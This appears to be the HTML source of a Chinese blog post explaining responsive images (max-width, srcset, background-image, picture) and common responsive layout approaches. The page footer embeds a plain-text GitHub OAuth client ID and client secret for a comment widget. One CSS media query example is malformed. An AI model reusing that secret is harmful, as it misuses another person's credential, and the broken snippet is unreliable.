<span class="nt">&lt;p&gt;</span>这里的图片响应式包括两个方面，一个就是大小自适应，这样能够保证图片在不同的屏幕分辨率下出现压缩、拉伸的情况；一个就是根据不同的屏幕分辨率和设备像素比来尽可能选择高分辨率的图片，也就是当在小屏幕上不需要高清图或大图，这样我们用小图代替，就可以减少网络带宽了。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;h5</span> <span class="na">id=</span><span class="s">"1使用max-width图片自适应"</span><span class="nt">&gt;</span>1.使用max-width（图片自适应）:<span class="nt">&lt;/h5&gt;</span>

<span class="nt">&lt;p&gt;</span>图片自适应意思就是图片能随着容器的大小进行缩放，可以采用如下代码：<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span>img {
    display: inline-block;
    max-width: 100%;
    height: auto;
}
复制代码
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</span>

<span class="nt">&lt;p&gt;&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>inline-block<span class="nt">&lt;/code&gt;</span> 元素相对于它周围的内容以内联形式呈现，但与内联不同的是，这种情况下我们可以设置宽度和高度。 <span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>max-width<span class="nt">&lt;/code&gt;</span>保证了图片能够随着容器的进行等宽扩充（即保证所有图片最大显示为其自身的 100%。此时，如果包含图片的元素比图片固有宽度小，图片会缩放占满最大可用空间），而<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>height<span class="nt">&lt;/code&gt;</span>为<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>auto<span class="nt">&lt;/code&gt;</span>可以保证图片进行等比缩放而不至于失真。如果是背景图片的话要灵活运用<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>background-size<span class="nt">&lt;/code&gt;</span>属性。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>那么为什么不能用<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>width：100%<span class="nt">&lt;/code&gt;</span>呢？因为这条规则会导致它显示得跟它的容器一样宽。在容器比图片宽得多的情况下，图片会被无谓地拉伸。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;h5</span> <span class="na">id=</span><span class="s">"2使用srcset"</span><span class="nt">&gt;</span>2.使用srcset<span class="nt">&lt;/h5&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span><span class="ni">&amp;lt;</span>img srcset="photo_w350.jpg 1x, photo_w640.jpg 2x" src="photo_w350.jpg" alt=""<span class="ni">&amp;gt;</span>
复制代码
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</span>

<span class="nt">&lt;p&gt;</span>如果屏幕的dpi = 1的话则加载1倍图，而dpi = 2则加载2倍图，手机和mac基本上dpi都达到了2以上，这样子对于普通屏幕来说不会浪费流量，而对于视网膜屏来说又有高清的体验。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>如果浏览器不支持<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>srcset<span class="nt">&lt;/code&gt;</span>，则默认加载src里面的图片。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>但是你会发现实际情况并不是如此，在Mac上的Chrome它会同时加载<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>srcset<span class="nt">&lt;/code&gt;</span>里面的那张2x的，还会再去加载src里面的那张，加载两张图片。顺序是先把所有<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>srcset<span class="nt">&lt;/code&gt;</span>里面的加载完了，再去加载src的。这个策略比较奇怪，它居然会加载两张图片，如果不写src，则不会加载两张，但是兼容性就没那么好。这个可能是因为浏览器认为，既然有<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>srcset<span class="nt">&lt;/code&gt;</span>就不用写src了，如果写了src，用户可能是有用的。而使用<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>picture<span class="nt">&lt;/code&gt;</span>就不会加载两张<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;h5</span> <span class="na">id=</span><span class="s">"3使用background-image"</span><span class="nt">&gt;</span>3.使用background-image<span class="nt">&lt;/h5&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span>.banner{
  background-image: url(/static/large.jpg);
}

@media screen and (max-width: 767px){
  background-image: url(/static/small.jpg);
}
复制代码
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</span>

<span class="nt">&lt;h5</span> <span class="na">id=</span><span class="s">"4使用picture标签"</span><span class="nt">&gt;</span>4.使用picture标签<span class="nt">&lt;/h5&gt;</span>

<span class="nt">&lt;p&gt;&lt;a</span> <span class="na">href=</span><span class="s">"https://link.juejin.im/?target=https%3A%2F%2Fscottjehl.github.io%2Fpicturefill%2F"</span><span class="nt">&gt;</span>picturefill.min.js<span class="nt">&lt;/a&gt;</span> ：解决IE等浏览器不支持 的问题<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span><span class="ni">&amp;lt;</span>picture<span class="ni">&amp;gt;</span>
    <span class="ni">&amp;lt;</span>source srcset="banner_w1000.jpg" media="(min-width: 801px)"<span class="ni">&amp;gt;</span>
    <span class="ni">&amp;lt;</span>source srcset="banner_w800.jpg" media="(max-width: 800px)"<span class="ni">&amp;gt;</span>
    <span class="ni">&amp;lt;</span>img src="banner_w800.jpg" alt=""<span class="ni">&amp;gt;</span>
<span class="ni">&amp;lt;</span>/picture<span class="ni">&amp;gt;</span>

<span class="ni">&amp;lt;</span>!-- picturefill.min.js 解决IE等浏览器不支持 <span class="ni">&amp;lt;</span>picture<span class="ni">&amp;gt;</span> 的问题 --<span class="ni">&amp;gt;</span>
<span class="ni">&amp;lt;</span>script type="text/javascript" src="js/vendor/picturefill.min.js"<span class="ni">&amp;gt;&amp;lt;</span>/script<span class="ni">&amp;gt;</span>
复制代码
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</span>

<span class="nt">&lt;p&gt;&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>picture<span class="nt">&lt;/code&gt;</span>必须要写img标签，否则无法显示，对<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>pictur<span class="nt">&lt;/code&gt;</span>e的操作最后都是在img上面，例如onload事件是在img标签触发的，<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>picture<span class="nt">&lt;/code&gt;</span>和<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>source<span class="nt">&lt;/code&gt;</span>是不会进行layout的，它们的宽和高都是0。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>另外使用<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>source<span class="nt">&lt;/code&gt;</span>，还可以对图片格式做一些兼容处理：<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span><span class="ni">&amp;lt;</span>picture<span class="ni">&amp;gt;</span>
    <span class="ni">&amp;lt;</span>source type="image/webp" srcset="banner.webp"<span class="ni">&amp;gt;</span>
    <span class="ni">&amp;lt;</span>img src="banner.jpg" alt=""<span class="ni">&amp;gt;</span>
<span class="ni">&amp;lt;</span>/picture<span class="ni">&amp;gt;</span>
复制代码
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</span>

<span class="nt">&lt;p&gt;&lt;strong&gt;</span>总结<span class="nt">&lt;/strong&gt;</span>：响应式布局的实现可以通过媒体查询+<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>px<span class="nt">&lt;/code&gt;</span>,媒体查询+百分比，媒体查询+<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>rem<span class="nt">&lt;/code&gt;</span>+<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>js<span class="nt">&lt;/code&gt;</span>,<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>vm/vh<span class="nt">&lt;/code&gt;</span>,<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>vm/vh<span class="nt">&lt;/code&gt;</span> +<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>rem<span class="nt">&lt;/code&gt;</span>这几种方式来实现。但每一种方式都是有缺点的，媒体查询需要选取主流设备宽度尺寸作为断点针对性写额外的样式进行适配，但这样做会比较麻烦，只能在选取的几个主流设备尺寸下呈现完美适配，另外用户体验也不友好，布局在响应断点范围内的分辨率下维持不变，而在响应断点切换的瞬间，布局带来断层式的切换变化，如同卡带的唱机般“咔咔咔”地一下又一下。通过百分比来适配首先是计算麻烦，第二各个属性中如果使用百分比，其相对的元素的属性并不是唯一的，这样就造成我们使用百分比单位容易使布局问题变得复杂。通过采用<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>rem<span class="nt">&lt;/code&gt;</span>单位的动态计算的弹性布局，则是需要在头部内嵌一段脚本来进行监听分辨率的变化来动态改变根元素字体大小，使得<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>CSS<span class="nt">&lt;/code&gt;</span>与<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>JS<span class="nt">&lt;/code&gt;</span> 耦合了在一起。通过利用纯<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>css<span class="nt">&lt;/code&gt;</span>视口单位实现适配的页面，是既能解决响应式断层问题，又能解决脚本依赖的问题的，但是兼容性还没有完全能结构接受。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;h2</span> <span class="na">id=</span><span class="s">"响应式布局的成型方案"</span><span class="nt">&gt;</span>响应式布局的成型方案<span class="nt">&lt;/h2&gt;</span>

<span class="nt">&lt;p&gt;</span>现在的css，UI框架等都已经考虑到了适配不同屏幕分辨率的问题，实际项目中我们可以直接使用这些新特性和框架来实现响应式布局。可以有以下选择方案：<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;ul&gt;</span>
  <span class="nt">&lt;li&gt;</span>利用上面的方法自己来实现，比如CSS3 Media Query,rem，vw等<span class="nt">&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;</span>Flex弹性布局，兼容性较差<span class="nt">&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;</span>Grid网格布局，兼容性较差<span class="nt">&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;</span>Columns栅格系统，往往需要依赖某个UI库，如Bootstrap<span class="nt">&lt;/li&gt;</span>
<span class="nt">&lt;/ul&gt;</span>

<span class="nt">&lt;h2</span> <span class="na">id=</span><span class="s">"响应式布局的要点"</span><span class="nt">&gt;</span>响应式布局的要点<span class="nt">&lt;/h2&gt;</span>

<span class="nt">&lt;p&gt;</span>在实际项目中，我们可能需要综合上面的方案，比如用<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>rem<span class="nt">&lt;/code&gt;</span>来做字体的适配，用<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>srcset<span class="nt">&lt;/code&gt;</span>来做图片的响应式，宽度可以用<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>rem<span class="nt">&lt;/code&gt;</span>，<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>flex<span class="nt">&lt;/code&gt;</span>，栅格系统等来实现响应式，然后可能还需要利用媒体查询来作为响应式布局的基础，因此综合上面的实现方案，项目中实现响应式布局需要注意下面几点：<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;ul&gt;</span>
  <span class="nt">&lt;li&gt;</span>设置viewport<span class="nt">&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;</span>媒体查询<span class="nt">&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;</span>字体的适配（字体单位）<span class="nt">&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;</span>百分比布局<span class="nt">&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;</span>图片的适配（图片的响应式）<span class="nt">&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;</span>结合flex，grid，BFC，栅格系统等已经成型的方案<span class="nt">&lt;/li&gt;</span>
<span class="nt">&lt;/ul&gt;</span>

<span class="nt">&lt;p&gt;&lt;strong&gt;</span>参考文章：<span class="nt">&lt;/strong&gt;&lt;/p&gt;</span>

<span class="nt">&lt;ol&gt;</span>
  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"https://juejin.im/post/6844903630655471624#heading-0"</span><span class="nt">&gt;</span>响应式布局的常用解决方案对比(媒体查询、百分比、rem和vw/vh）<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"http://caibaojian.com/vw-vh.html"</span><span class="nt">&gt;</span>纯CSS3使用vw和vh视口单位实现自适应<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"https://juejin.im/post/6844903654323929096#heading-9"</span><span class="nt">&gt;</span>你真的了解响应式布局吗？<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"http://www.ghugo.com/mobile-h5-fluid-layout-for-iphone6/"</span><span class="nt">&gt;</span>移动端H5页面 iphone6的适配技巧<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"https://juejin.im/post/6844903479681499150"</span><span class="nt">&gt;</span>响应式开发心得<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"https://juejin.im/post/6844903513651150856#heading-10"</span><span class="nt">&gt;</span>详解前端响应式布局、响应式图片，与自制栅格系统<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"https://juejin.im/post/6844903648099565576"</span><span class="nt">&gt;</span>基于媒体查询和 rem 的响应式布局实践<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"https://www.cnblogs.com/lyzg/p/4877277.html"</span><span class="nt">&gt;</span>从网易与淘宝的font-size思考前端设计稿与工作流<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"http://www.vsoui.com/2017/03/15/mobile-FE-Adaptive/"</span><span class="nt">&gt;</span>移动端前端适配方案对比<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
<span class="nt">&lt;/ol&gt;</span>

<span class="nt">&lt;p&gt;&lt;a</span> <span class="na">href=</span><span class="s">"https://juejin.im/post/6844903814332432397"</span><span class="nt">&gt;</span>Link<span class="nt">&lt;/a&gt;&lt;/p&gt;</span>



                <span class="nt">&lt;hr</span> <span class="na">style=</span><span class="s">"visibility: hidden;"</span><span class="nt">&gt;</span>

                <span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">"pager"</span><span class="nt">&gt;</span>
                    
                    <span class="nt">&lt;li</span> <span class="na">class=</span><span class="s">"previous"</span><span class="nt">&gt;</span>
                        <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/2020/10/11/%E5%88%9D%E4%B8%AD%E7%BA%A7%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E9%A2%98/"</span> <span class="na">data-toggle=</span><span class="s">"tooltip"</span> <span class="na">data-placement=</span><span class="s">"top"</span> <span class="na">title=</span><span class="s">"初中级前端面试题"</span><span class="nt">&gt;</span>
                        Previous<span class="nt">&lt;br&gt;</span>
                        <span class="nt">&lt;span&gt;</span>初中级前端面试题<span class="nt">&lt;/span&gt;</span>
                        <span class="nt">&lt;/a&gt;</span>
                    <span class="nt">&lt;/li&gt;</span>
                    
                    
                    <span class="nt">&lt;li</span> <span class="na">class=</span><span class="s">"next"</span><span class="nt">&gt;</span>
                        <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/2020/10/12/javascript%E7%9A%84setTimeout()%E7%94%A8%E6%B3%95%E6%80%BB%E7%BB%93-js%E7%9A%84setTimeout()%E6%96%B9%E6%B3%95/"</span> <span class="na">data-toggle=</span><span class="s">"tooltip"</span> <span class="na">data-placement=</span><span class="s">"top"</span> <span class="na">title=</span><span class="s">"前端安全系列（一）如何防止XSS攻击"</span><span class="nt">&gt;</span>
                        Next<span class="nt">&lt;br&gt;</span>
                        <span class="nt">&lt;span&gt;</span>前端安全系列（一）如何防止XSS攻击<span class="nt">&lt;/span&gt;</span>
                        <span class="nt">&lt;/a&gt;</span>
                    <span class="nt">&lt;/li&gt;</span>
                    
                <span class="nt">&lt;/ul&gt;</span>


                <span class="c">&lt;!--Gitalk评论start  --&gt;</span>
                
                <span class="c">&lt;!-- 引入Gitalk评论插件  --&gt;</span>
                <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"https://unpkg.com/gitalk/dist/gitalk.css"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"https://unpkg.com/gitalk@latest/dist/gitalk.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
                <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"gitalk-container"</span><span class="nt">&gt;&lt;/div&gt;</span>
                <span class="c">&lt;!-- 引入一个生产md5的js，用于对id值进行处理，防止其过长 --&gt;</span>
                <span class="c">&lt;!-- Thank DF:https://github.com/NSDingFan/NSDingFan.github.io/issues/3#issuecomment-407496538 --&gt;</span>
                <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"/js/md5.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
                <span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
                    <span class="kd">var</span> <span class="nx">gitalk</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Gitalk</span><span class="p">({</span>
                    <span class="na">clientID</span><span class="p">:</span> <span class="dl">'</span><span class="s1">b070bb95e57a3650e202</span><span class="dl">'</span><span class="p">,</span>
                    <span class="na">clientSecret</span><span class="p">:</span> <span class="dl">'</span><span class="s1">8420656a991994ea4aa65c2249b6583d6a4c4c54</span><span class="dl">'</span><span class="p">,</span>
                    <span class="na">repo</span><span class="p">:</span> <span class="dl">'</span><span class="s1">tian-guo-guo.github.io</span><span class="dl">'</span><span class="p">,</span>
                    <span class="na">owner</span><span class="p">:</span> <span class="dl">'</span><span class="s1">tian-guo-guo</span><span class="dl">'</span><span class="p">,</span>
                    <span class="na">admin</span><span class="p">:</span> <span class="p">[</span><span class="dl">'</span><span class="s1">tian-guo-guo</span><span class="dl">'</span><span class="p">],</span>
                    <span class="na">distractionFreeMode</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
                    <span class="na">id</span><span class="p">:</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">pathname</span><span class="p">),</span>
                    <span class="p">});</span>
                    <span class="nx">gitalk</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">gitalk-container</span><span class="dl">'</span><span class="p">);</span>
                <span class="nt">&lt;/script&gt;</span>
                
                <span class="c">&lt;!-- Gitalk end --&gt;</span>

                

            <span class="nt">&lt;/div&gt;</span>  

    <span class="c">&lt;!-- Side Catalog Container --&gt;</span>
        
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"
                col-lg-2 col-lg-offset-0
                visible-lg-block
                sidebar-container
                catalog-container"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"side-catalog"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;hr</span> <span class="na">class=</span><span class="s">"hidden-sm hidden-xs"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;h5&gt;</span>
                        <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"catalog-toggle"</span> <span class="na">href=</span><span class="s">"#"</span><span class="nt">&gt;</span>CATALOG<span class="nt">&lt;/a&gt;</span>
                    <span class="nt">&lt;/h5&gt;</span>
                    <span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">"catalog-body"</span><span class="nt">&gt;&lt;/ul&gt;</span>
                <span class="nt">&lt;/div&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
        

    <span class="c">&lt;!-- Sidebar Container --&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"
                col-lg-8 col-lg-offset-2
                col-md-10 col-md-offset-1
                sidebar-container"</span><span class="nt">&gt;</span>

                <span class="c">&lt;!-- Featured Tags --&gt;</span>
                
                <span class="nt">&lt;section&gt;</span>
                    <span class="nt">&lt;hr</span> <span class="na">class=</span><span class="s">"hidden-sm hidden-xs"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;h5&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/tags/"</span><span class="nt">&gt;</span>FEATURED TAGS<span class="nt">&lt;/a&gt;&lt;/h5&gt;</span>
                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"tags"</span><span class="nt">&gt;</span>
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#技术"</span> <span class="na">title=</span><span class="s">"技术"</span> <span class="na">rel=</span><span class="s">"50"</span><span class="nt">&gt;</span>
                                    技术
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#python"</span> <span class="na">title=</span><span class="s">"python"</span> <span class="na">rel=</span><span class="s">"102"</span><span class="nt">&gt;</span>
                                    python
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#nlp"</span> <span class="na">title=</span><span class="s">"nlp"</span> <span class="na">rel=</span><span class="s">"59"</span><span class="nt">&gt;</span>
                                    nlp
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#paper"</span> <span class="na">title=</span><span class="s">"paper"</span> <span class="na">rel=</span><span class="s">"60"</span><span class="nt">&gt;</span>
                                    paper
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#机器翻译"</span> <span class="na">title=</span><span class="s">"机器翻译"</span> <span class="na">rel=</span><span class="s">"57"</span><span class="nt">&gt;</span>
                                    机器翻译
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#专利"</span> <span class="na">title=</span><span class="s">"专利"</span> <span class="na">rel=</span><span class="s">"17"</span><span class="nt">&gt;</span>
                                    专利
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#新能源"</span> <span class="na">title=</span><span class="s">"新能源"</span> <span class="na">rel=</span><span class="s">"6"</span><span class="nt">&gt;</span>
                                    新能源
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#pytorch"</span> <span class="na">title=</span><span class="s">"pytorch"</span> <span class="na">rel=</span><span class="s">"9"</span><span class="nt">&gt;</span>
                                    pytorch
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#学习日记"</span> <span class="na">title=</span><span class="s">"学习日记"</span> <span class="na">rel=</span><span class="s">"39"</span><span class="nt">&gt;</span>
                                    学习日记
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#github"</span> <span class="na">title=</span><span class="s">"github"</span> <span class="na">rel=</span><span class="s">"4"</span><span class="nt">&gt;</span>
                                    github
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#numpy"</span> <span class="na">title=</span><span class="s">"numpy"</span> <span class="na">rel=</span><span class="s">"4"</span><span class="nt">&gt;</span>
                                    numpy
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#娱乐"</span> <span class="na">title=</span><span class="s">"娱乐"</span> <span class="na">rel=</span><span class="s">"1"</span><span class="nt">&gt;</span>
                                    娱乐
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#钢琴"</span> <span class="na">title=</span><span class="s">"钢琴"</span> <span class="na">rel=</span><span class="s">"1"</span><span class="nt">&gt;</span>
                                    钢琴
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#读书笔记"</span> <span class="na">title=</span><span class="s">"读书笔记"</span> <span class="na">rel=</span><span class="s">"14"</span><span class="nt">&gt;</span>
                                    读书笔记
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#道德经"</span> <span class="na">title=</span><span class="s">"道德经"</span> <span class="na">rel=</span><span class="s">"7"</span><span class="nt">&gt;</span>
                                    道德经
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#迁移学习"</span> <span class="na">title=</span><span class="s">"迁移学习"</span> <span class="na">rel=</span><span class="s">"2"</span><span class="nt">&gt;</span>
                                    迁移学习
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#硅谷来信"</span> <span class="na">title=</span><span class="s">"硅谷来信"</span> <span class="na">rel=</span><span class="s">"4"</span><span class="nt">&gt;</span>
                                    硅谷来信
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#爬虫"</span> <span class="na">title=</span><span class="s">"爬虫"</span> <span class="na">rel=</span><span class="s">"6"</span><span class="nt">&gt;</span>
                                    爬虫
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
